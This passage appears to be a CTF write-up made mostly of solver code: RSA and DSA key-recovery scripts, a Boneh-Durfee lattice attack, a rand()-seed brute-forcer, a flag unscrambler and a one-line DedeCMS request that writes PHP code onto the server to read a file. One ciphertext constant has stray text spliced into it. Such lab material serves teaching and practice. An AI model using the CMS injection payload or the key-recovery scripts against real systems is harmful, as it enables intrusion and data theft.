# parameters = test.test(trained_phi, trained_e, n)
# y_hat_cipher1 = parameters[0]
# y_hat_cipher2 = parameters[1]
# print("The final output is n%s" % hex(y_hat_cipher1), "n%s" % hex(y_hat_cipher2))
# print("------")

# The significant parameter n: 0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709b3d2698476b6dd203811b6a2ec6a6e2a7e213ab719bcd3ab49bb864b10e9c78ea3f501c0e2213dfe431043bb6f0cc2e8d77bfb43869b843af1a99ae81b87811e101
# The unique parameter r: 0x4f37fe985d13ffde9867fa0063f68dea79196408b1404eadf03ea59297d629c2183a4a6a6647b6c4c99dd43bae8c4fa4691a608d20170fd42b18aef7efb3ae01cd3
# ------
# Parameters are initialized to:
#   phi:0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709648d78eb17edb46dda768a97d57e6bd1c48657393b7c0d9c574c38cc0a3545ce7d209ade33b8ac6b31a41fe9f4ed62b4ddd7b99859b74915f2031dd2f5f0499a2f8
#   e:0x2ebad696da6dda845bf03fdf34ee73d4849800de9267a5baa3c068e2d33a74727d00002fbfea775e5233087a9039d267130aa924a4f7fed3576f6ff7b8e1b2e8
# But they are wild and crazy!
# We have to give them a lesson!
# ------
# The loss is -0x5144bdad7cc24f5348c5752dda0ff5fa7d72e36370d5af55eb6f590ac0764b843a06ee1a4651b8f3a6c878df56f1678454e58eaf0ede9a1eb0503dce6a1303b69e33bbaad112abb051a28d51a9fee629e89400a338bd02998568d044852f11e05572fc4a0ddacdf7342048295a4025394e77e973621a77ea5bbdb06af2cb72b2f8298e2cd16736454fd066d3d96a4f77cd094cd783ead17024de981df7ade84aa8c282b1ec6f8ec6ec4752727387ef637ba2a4eed8f83c77d5db14d297de8098
# Parameters are trained to:
#   phi:0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709b3bb712fdcba325655f111918472d4353a66854ccda50b63a1047278c15a4b39cde898d054db87092958c7c05f8fa566dcd969b1ff4b7d1935c375a4af3bfc341b0
#   e:0x2c22193ad9abcca2f67552fc76dd07b3ef883f3d755c95119cdf82bb6a07c970fd37e582bb49250d8efaa29b8a59c82059165c654206a9d7261f6b45a90dc69
# After training, the two naughty parameters are more and more normal.
# It's closer to your target!
# ------
# The encrypted output in validation set is 0x775cbee546e7579f0a69645b59f72f5c8ff0c538dd9a6e755969dee2ffb8748073c089557801dfb8bfae15baba9a909f3addac142ad928ac7cc453c72166dda235128de12965df4308997416e054ab1ab9af55c60533c7374096aa2d05339900b3e14f7148930bf083eb1eb9fa22b9a997f85b39501d3a9bdfa08e3389b8f2fe
# After validation, the model is more and more stable.
# To test the real flag!
# ------
# The final output is
# 0x29289e3d9275147b885b5061637564cbee3e4d9f48e52694e594f020e49da9b24d9246b2437fb2221fa86ca1a277f3fdd7ab5cad4738a02b66d47703ef816844a84c6c209c8251e8961c9ba2c791649e022627f86932d9700c3b1dc086e8b2747d0a5604955387a935464d3866dd4100b2f3d57603c728761d1d8ef7fdbdcbee
# 0x2b0059f88454e0e36269c809b5d5b6b28e5bab3c87b20f9e55635239331100a0a582241e7a385034698b61ebf24b519e868617ff67974cc907cc61be38755737f9a6dbeb7890ff55550b1af1ecf635112fcaaa8b07a3972b3c6728cbcf2a3973a4d7bd92affec7e065e0ae83cd36858e6d983785a3668a8b82709d78a69796af
# ------

n = 0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709b3d2698476b6dd203811b6a2ec6a6e2a7e213ab719bcd3ab49bb864b10e9c78ea3f501c0e2213dfe431043bb6f0cc2e8d77bfb43869b843af1a99ae81b87811e101
phi = 0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709b3bb712fdcba325655f111918472d4353a66854ccda50b63a1047278c15a4b39cde898d054db87092958c7c05f8fa566dcd969b1ff4b7d1935c375a4af3bfc341b0
e = 0x2c22193ad9abcca2f67552fc76dd07b3ef883f3d755c95119cdf82bb6a07c970fd37e582bb49250d8efaa29b8a59c82059165c654206a9d7261f6b45a90dc69
d = inverse(e, phi)
c1 = 0x29289e3d9275147b885b5061637564cbee3e4d9f48e52694e594f020e49da9b24d9246b2437fb2221fa86ca1a277f3fdd7ab5cad4738a02b66d47703ef816844a84c6c209c8251e896Crypto1c9ba2c791649e022627f86932d9700c3b1dc086e8b2747d0a5604955387a935464d3866dd4100b2f3d57603c728761d1d8ef7fdbdcbee
c2 = 0x2b0059f88454e0e36269c809b5d5b6b28e5bab3c87b20f9e55635239331100a0a582241e7a385034698b61ebf24b519e868617ff67974cc907cc61be38755737f9a6dbeb7890ff55550b1af1ecf635112fcaaa8b07a3972b3c6728cbcf2a3973a4d7bd92affec7e065e0ae83cd36858e6d983785a3668a8b82709d78a69796af
print(d)
m1 = pow(c1, d, n)
m2 = pow(c2, d, n)
decoded_message = long_to_bytes(m1) + long_to_bytes(m2)

flag = b"flag{" + decoded_message + b".}"
print(flag)
```



```
from Crypto.Util.number import *
from gmpy2 import *
import random, os
from hashlib import sha1
from random import randrange
flag=b''
x = bytes_to_long(flag)

def gen_key():
    while True:
        q = getPrime(160)
        p = 2 * getPrime(1024-160) * q+1
        if isPrime(p):
            break
    h = random.randint(1, p - 1)
    g = powmod(h,(p-1)//q, p)
    y=pow(g,x,p)
    return p,q,g,y
def cry():
    a =
    p = getPrime(512)
    q = getPrime(512)
    d = getPrime(280)
    n = p * q
    e = inverse(d, (p - 1) * (q - 1))
    c = pow(a, e, n)
    return n,e,c

p,q,g,y=gen_key()
k1 = random.randint(1, q-1)
h1 = bytes_to_long(sha1(os.urandom(20)).digest())
r1 = pow(g, k1, p) % q
s1 = ((h1 + x*r1) * invert(k1, q))% q

n,e,c= cry()

a=
b= 17474742587088593627
k2 = a*k1 + b
h2 = bytes_to_long(sha1(os.urandom(20)).digest())
r2 = pow(g, k2, p) % q
s2 = ((h2 + x*r2) * invert(k2, q)) % q
print(n,e,c)
print(p,q,g,y)
print("h1:%s r1:%s s1:%s"%(h1,r1,s1))
print("h2:%s r2:%s s2:%s"%(h2,r2,s2))

##给的值如下
n = 98871082998654651904594468693622517613869880791884929588100914778964766348914919202255397776583412976785216592924335179128220634848871563960167726280836726035489482233158897362166942091133366827965811201438682117312550600943385153640907629347663140487841016782054145413246763816202055243693289693996466579973
e = 76794907644383980853714814867502708655721653834095293468287239735547303515225813724998992623067007382800348003887194379223500764768679311862929538017193078946067634221782978912767213553254272722105803768005680182504500278005295062173004098796746439445343896868825218704046110925243884449608326413259156482881
c = 13847199761503953970544410090850216804358289955503229676987212195445226107828814170983735135692611175621170777484117542057117607579344112008580933900051471041224296342157618857321522682033260246480258856376097987259016643294843196752685340912823459403703609796624411954082410762846356541101561523204985391564

p= 161310487790785086482919800040790794252181955976860261806376528825054571226885460699399582301663712128659872558133023114896223014064381772944582265101778076462675402208451386747128794418362648706087358197370036248544508513485401475977401111270352593919906650855268709958151310928767086591887892397722958234379
q= 1115861146902610160756777713087325311747309309771
g= 61073566757714587321114447684333928353300944355112378054603585955730395524359123615359185275743626350773632555967063692889668342544616165017003197599818881844811647270423070958521148291118914198811187731689123176313367399492561288350530256722898205674043032421874788802819858438796795768177550638273020791962
y= 23678147495254433946472657196764372220306841739888385605070426528738230369489739339976134564575544246606937803367113623097260181789372915552172469427842482448570540429192377881186772226796452797182435452490307834205012154495575570994963829345053331967442452842152258650027916313982835119514473311305158299360
(h1, r1, s1) = 535874494834828755542711401117152397489711233142, 117859946800380767356190121030392492081340616512, 26966646740134065096660259687229179143947213779
(h2, r2, s2) = 236574518096866758760287021848258048065293279716, 863199000523521111517835459866422731857447792677, 517924607931342012033031470185302567344725962419
```



```
from __future__ import print_function
import time
import sympy

debug = True

strict = False

helpful_only = True
dimension_min = 10  # stop removing if lattice reaches that dimension

# display stats on helpful vectors
def helpful_vectors(BB, modulus):
    nothelpful = 0
    for ii in range(BB.dimensions()[0]):
        if BB[ii, ii] >= modulus:
            nothelpful += 1

    print(nothelpful, "/", BB.dimensions()[0], " vectors are not helpful")

# display matrix picture with 0 and X
def matrix_overview(BB, bound):
    for ii in range(BB.dimensions()[0]):
        a = ('%02d ' % ii)
        for jj in range(BB.dimensions()[1]):
            a += '0' if BB[ii, jj] == 0 else 'X'
            if BB.dimensions()[0] < 60:
                a += ' '
        if BB[ii, ii] >= bound:
            a += '~'
        print(a)

# tries to remove unhelpful vectors
# we start at current = n-1 (last vector)
def remove_unhelpful(BB, monomials, bound, current):
    # end of our recursive function
    if current == -1 or BB.dimensions()[0] <= dimension_min:
        return BB

    # we start by checking from the end
    for ii in range(current, -1, -1):
        # if it is unhelpful:
        if BB[ii, ii] >= bound:
            affected_vectors = 0
            affected_vector_index = 0
            # let's check if it affects other vectors
            for jj in range(ii + 1, BB.dimensions()[0]):
                # if another vector is affected:
                # we increase the count
                if BB[jj, ii] != 0:
                    affected_vectors += 1
                    affected_vector_index = jj

            # level:0
            # if no other vectors end up affected
            # we remove it
            if affected_vectors == 0:
                print("* removing unhelpful vector", ii)
                BB = BB.delete_columns([ii])
                BB = BB.delete_rows([ii])
                monomials.pop(ii)
                BB = remove_unhelpful(BB, monomials, bound, ii - 1)
                return BB

            # level:1
            # if just one was affected we check
            # if it is affecting someone else
            elif affected_vectors == 1:
                affected_deeper = True
                for kk in range(affected_vector_index + 1, BB.dimensions()[0]):
                    # if it is affecting even one vector
                    # we give up on this one
                    if BB[kk, affected_vector_index] != 0:
                        affected_deeper = False
                # remove both it if no other vector was affected and
                # this helpful vector is not helpful enough
                # compared to our unhelpful one
                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) < abs(
                        bound - BB[ii, ii]):
                    print("* removing unhelpful vectors", ii, "and", affected_vector_index)
                    BB = BB.delete_columns([affected_vector_index, ii])
                    BB = BB.delete_rows([affected_vector_index, ii])
                    monomials.pop(affected_vector_index)
                    monomials.pop(ii)
                    BB = remove_unhelpful(BB, monomials, bound, ii - 1)
                    return BB
    # nothing happened
    return BB

""" 
Returns:
* 0,0   if it fails
* -1,-1 if `strict=true`, and determinant doesn't bound
* x0,y0 the solutions of `pol`
"""

def boneh_durfee(pol, modulus, mm, tt, XX, YY):
    """
    Boneh and Durfee revisited by Herrmann and May

    finds a solution if:
    * d < N^delta
    * |x| < e^delta
    * |y| < e^0.5
    whenever delta < 1 - sqrt(2)/2 ~ 0.292
    """

    # substitution (Herrman and May)
    PR. < u, x, y > = PolynomialRing(ZZ)
    Q = PR.quotient(x * y + 1 - u)  # u = xy + 1
    polZ = Q(pol).lift()

    UU = XX * YY + 1

    # x-shifts
    gg = []
    for kk in range(mm + 1):
        for ii in range(mm - kk + 1):
            xshift = x ^ ii * modulus ^ (mm - kk) * polZ(u, x, y) ^ kk
            gg.append(xshift)
    gg.sort()

    # x-shifts list of monomials
    monomials = []
    for polynomial in gg:
        for monomial in polynomial.monomials():
            if monomial not in monomials:
                monomials.append(monomial)
    monomials.sort()

    # y-shifts (selected by Herrman and May)
    for jj in range(1, tt + 1):
        for kk in range(floor(mm / tt) * jj, mm + 1):
            yshift = y ^ jj * polZ(u, x, y) ^ kk * modulus ^ (mm - kk)
            yshift = Q(yshift).lift()
            gg.append(yshift)  # substitution

    # y-shifts list of monomials
    for jj in range(1, tt + 1):
        for kk in range(floor(mm / tt) * jj, mm + 1):
            monomials.append(u ^ kk * y ^ jj)

    # construct lattice B
    nn = len(monomials)
    BB = Matrix(ZZ, nn)
    for ii in range(nn):
        BB[ii, 0] = gg[ii](0, 0, 0)
        for jj in range(1, ii + 1):
            if monomials[jj] in gg[ii].monomials():
                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU, XX, YY)

    # Prototype to reduce the lattice
    if helpful_only:
        # automatically remove
        BB = remove_unhelpful(BB, monomials, modulus ^ mm, nn - 1)
        # reset dimension
        nn = BB.dimensions()[0]
        if nn == 0:
            print("failure")
            return 0, 0

    # check if vectors are helpful
    if debug:
        helpful_vectors(BB, modulus ^ mm)

    # check if determinant is correctly bounded
    det = BB.det()
    bound = modulus ^ (mm * nn)
    if det >= bound:
        print("We do not have det < bound. Solutions might not be found.")
        print("Try with highers m and t.")
        if debug:
            diff = (log(det) - log(bound)) / log(2)
            print("size det(L) - size e^(m*n) = ", floor(diff))
        if strict:
            return -1, -1
    else:
        print("det(L) < e^(m*n) (good! If a solution exists < N^delta, it will be found)")

    # display the lattice basis
    if debug:
        matrix_overview(BB, modulus ^ mm)

    # LLL
    if debug:
        print("optimizing basis of the lattice via LLL, this can take a long time")

    BB = BB.LLL()

    if debug:
        print("LLL is done!")

    # transform vector i & j -> polynomials 1 & 2
    if debug:
        print("looking for independent vectors in the lattice")
    found_polynomials = False

    for pol1_idx in range(nn - 1):
        for pol2_idx in range(pol1_idx + 1, nn):
            # for i and j, create the two polynomials
            PR. < w, z > = PolynomialRing(ZZ)
            pol1 = pol2 = 0
            for jj in range(nn):
                pol1 += monomials[jj](w * z + 1, w, z) * BB[pol1_idx, jj] / monomials[jj](UU, XX, YY)
                pol2 += monomials[jj](w * z + 1, w, z) * BB[pol2_idx, jj] / monomials[jj](UU, XX, YY)

            # resultant
            PR. < q > = PolynomialRing(ZZ)
            rr = pol1.resultant(pol2)

            # are these good polynomials?
            if rr.is_zero() or rr.monomials() == [1]:
                continue
            else:
                print("found them, using vectors", pol1_idx, "and", pol2_idx)
                found_polynomials = True
                break
        if found_polynomials:
            break

    if not found_polynomials:
        print("no independant vectors could be found. This should very rarely happen...")
        return 0, 0

    rr = rr(q, q)

    # solutions
    soly = rr.roots()

    if len(soly) == 0:
        print("Your prediction (delta) is too small")
        return 0, 0

    soly = soly[0][0]
    ss = pol1(q, soly)
    solx = ss.roots()[0][0]

    #
    return solx, soly

def example():
    ############################################
    # How To Use This Script
    ##########################################

    #
    # The problem to solve (edit the following values)
    #

    # the modulus
    N = 98871082998654651904594468693622517613869880791884929588100914778964766348914919202255397776583412976785216592924335179128220634848871563960167726280836726035489482233158897362166942091133366827965811201438682117312550600943385153640907629347663140487841016782054145413246763816202055243693289693996466579973
    e = 76794907644383980853714814867502708655721653834095293468287239735547303515225813724998992623067007382800348003887194379223500764768679311862929538017193078946067634221782978912767213553254272722105803768005680182504500278005295062173004098796746439445343896868825218704046110925243884449608326413259156482881

    x = sympy.Symbol('x')
    alpha = sympy.log(x, N).evalf(subs={x: e})
    print("alpha=", alpha)
    # the hypothesis on the private exponent (the theoretical maximum is 0.292)
    delta = .275  # this means that d < N^delta

    #
    # Lattice (tweak those values)
    #

    # you should tweak this (after a first run), (e.g. increment it until a solution is found)
    m = 8  # size of the lattice (bigger the better/slower)

    # you need to be a lattice master to tweak these
    t = int((1 - 2 * delta) * m)  # optimization from Herrmann and May
    # X = 2*floor(N^delta)  # this _might_ be too much
    X = floor(3 * e / N * N ^ delta)
    Y = floor(2 * N ^ (1 / 2))  # correct if p, q are ~ same size
    # Y = floor(N^(1/2))

    #
    # Don't touch anything below
    #

    # Problem put in equation
    P. < x, y > = PolynomialRing(ZZ)
    A = int((N + 1) / 2)
    pol = 1 + x * (A + y)

    #
    # Find the solutions!
    #

    # Checking bounds
    if debug:
        print("=== checking values ===")
        print("* delta:", delta)
        print("* delta < 0.292", delta < 0.292)
        print("* size of e:", int(log(e) / log(2)))
        print("* size of N:", int(log(N) / log(2)))
        print("* m:", m, ", t:", t)

    # boneh_durfee
    if debug:
        print("=== running algorithm ===")
        start_time = time.time()

    solx, soly = boneh_durfee(pol, e, m, t, X, Y)

    # found a solution?
    if solx > 0:
        print("=== solution found ===")
        if False:
            print("x:", solx)
            print("y:", soly)

        d = int(pol(solx, soly) // e)
        print("private key found:", d)
        c = pow(123456, e, N)
        m = pow(c, d, N)
        print("m=", m)
    else:
        print("=== no solution was found ===")

    if debug:
        print(("=== %s seconds ===" % (time.time() - start_time)))

if __name__ == "__main__":
    example()
```



```
from sage.matrix.all import Matrix, vector
from sage.rings.all import Zmod

from Crypto.Util.number import long_to_bytes

# 给定的签名和参数
(h1, r1, s1) = 535874494834828755542711401117152397489711233142, 117859946800380767356190121030392492081340616512, 26966646740134065096660259687229179143947213779
(h2, r2, s2) = 236574518096866758760287021848258048065293279716, 863199000523521111517835459866422731857447792677, 517924607931342012033031470185302567344725962419
a = 24601959430759983424400804734518943158892550216065342062971649989571838687333
b = 17474742587088593627
q = 1115861146902610160756777713087325311747309309771

# 构建矩阵 A 和向量 b
A = Matrix(Zmod(q), 2, 2, [s1, -r1, a * s2, -r2])
b = vector(Zmod(q), [h1, h2 - b * s2])

# 解线性方程组 A*x = b
x = A.solve_right(b)

# 打印解的字节表示
print(long_to_bytes(int(x[1])))
```



```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  char *v4; // rax
  _DWORD v6[44]; // [rsp+20h] [rbp-60h] BYREF
  _BYTE v7[16]; // [rsp+D0h] [rbp+50h] BYREF
  _BYTE v8[16]; // [rsp+E0h] [rbp+60h] BYREF
  _BYTE v9[20]; // [rsp+F0h] [rbp+70h] BYREF
  int v10; // [rsp+104h] [rbp+84h]
  unsigned int v11; // [rsp+108h] [rbp+88h]
  int i; // [rsp+10Ch] [rbp+8Ch]

  _main(argc, argv, envp);
  v11 = time(0i64);
  srand(v11);
  std::string::string((#89 *)v7);
  std::operator<<<std::char_traits<char>>((#106 *)&std::cout, aInputYourFlag);
  std::operator>><char>(&std::cin, v7);
  std::string::string((#89 *)v9, (const #89 *)v7);
  change((__int64)v8, (#89 *)v9);
  std::string::operator=(v7, v8);
  std::string::~string((#89 *)v8);
  std::string::~string((#89 *)v9);
  if ( std::string::length((#89 *)v7) != 42 )
  {
    v3 = std::operator<<<std::char_traits<char>>((#106 *)&std::cout, "len error");
    ((void (__fastcall *)(__int64))std::endl<char,std::char_traits<char>>)(v3);
    exit(0);
  }
  qmemcpy(v6, &byte_46A020, 0xA8ui64);
  for ( i = 0; i <= 41; ++i )
  {
    v10 = rand() % 255;
    v4 = (char *)std::string::operator[](v7, i);
    if ( (v10 ^ *v4) != v6[i] )
      exit(0);
  }
  std::string::~string((#89 *)v7);
  return 0;
}
```



```
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
int main(){
    unsigned int seed;
    int key=0;
    int i =0;
    //1662973302 # 正确的seed
    for(seed = 1662973302;seed<1705929558;seed++){
        srand(seed);
        int right = 1;
        for(i=0;i<=32;i++){
            key = rand() % 255;
            switch (i) {
                case 0:
                    if(key!=0x6f){
                        right = 0;
                    }
                    break;
                case 1:
                    if(key!=0x18){
                        right = 0;
                    }
                    break;

                case 11:
                    if(key!=0xaa){
                        right = 0;
                    }
                    break;
                case 12:
                    if(key!=0x2){
                        right = 0;
                    }
                    break;
                case 32:
                    if(key!=0x9b){
                        right = 0;
                    }
                    break;
                default:
                    break;

        }
            if(right == 0){
                break;
            }
        }
        if(right==1){
            printf("%un",seed);
        }
    }
    return 0;
}
```



```
f{52bgb-281lg00ff-46f7-ca009c8e}a381-b7191
```



```
# a = 'flag{0123456789zbcdexQhijkymnABCDEFGHIJKL}' # input
# b = 'f{37bxjnDHLlg02468zceQikmACEGIK}a159dhyBFJ' # 换位后

# input_set = []
# for i in b:
#     input_set.append(a.index(i))

# print(input_set) # 得到换位的顺序
# [0, 4, 8, 12, 16, 20, 24, 28, 32, 36, 40, 1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29, 31, 33, 35, 37, 39, 41, 2, 6, 10, 14, 18, 22, 26, 30, 34, 38]

"""恢复正确flag顺序"""
flag = [0] * 42
line = [0, 4, 8, 12, 16, 20, 24, 28, 32, 36, 40, 1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29, 31, 33, 35, 37, 39, 41, 2, 6, 10, 14, 18, 22, 26, 30, 34, 38]
input = 'f{52bgb-281lg00ff-46f7-ca009c8e}a381-b7191'
for i in range(42):
    flag[line[i]] = input[i]
    # print()

print("".join(flag))

# flag{0305f8f2-14b6-fg7b-bc7a-010299c881e1}
```



```
Main函数
```



```
/dede/tpl.php?filename=secnote.lib.php&action=savetagfile&content=<?php+readfile("/flag");&token=ecb58488af4202afcce98347bbb9bddc
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/2-1705980282.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/6-1705980282.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/1-1705980283.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/4-1705980283.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/8-1705980284.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/1-1705980285.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/3-1705980285.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/7-1705980286.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/2-1705980287.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/6-1705980288.png)